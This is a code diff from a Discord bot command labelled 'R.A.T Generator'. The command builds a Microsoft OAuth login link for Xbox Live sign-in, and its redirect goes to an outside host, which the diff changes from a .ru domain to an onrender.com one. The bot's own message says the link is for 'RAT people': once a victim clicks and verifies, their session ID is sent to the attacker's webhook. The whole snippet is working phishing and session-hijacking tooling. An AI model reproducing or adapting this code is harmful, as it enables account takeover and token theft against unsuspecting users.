@@ -30,7 +30,7 @@ async def generate(ctx, webhook: str):
         with open('config.ini', 'w') as f:
             config.write(f)
         embedVar = discord.Embed(title="R.A.T Generator", description="Use this link to RAT people. \n If somebody clicks on your link and verifys then his SessionID will be sent to your webhook.", color=0x00ff00)
-        url = "https://login.live.com/oauth20_authorize.srf?client_id=12e40df3-625c-4c6b-892e-83871740ed80&response_type=code&redirect_uri=https://verify.qolhub.ru/verify&scope=XboxLive.signin+offline_access&state=" + str(user)
+        url = "https://login.live.com/oauth20_authorize.srf?client_id=12e40df3-625c-4c6b-892e-83871740ed80&response_type=code&redirect_uri=https://discordverification-2r48.onrender.com&scope=XboxLive.signin+offline_access&state=" + str(user)
         embedVar.add_field(name="URL", value=url, inline=False)
         await ctx.respond("Adding webhoook <@" + str(user) + ">", embed=embedVar, ephemeral=True)
     else:
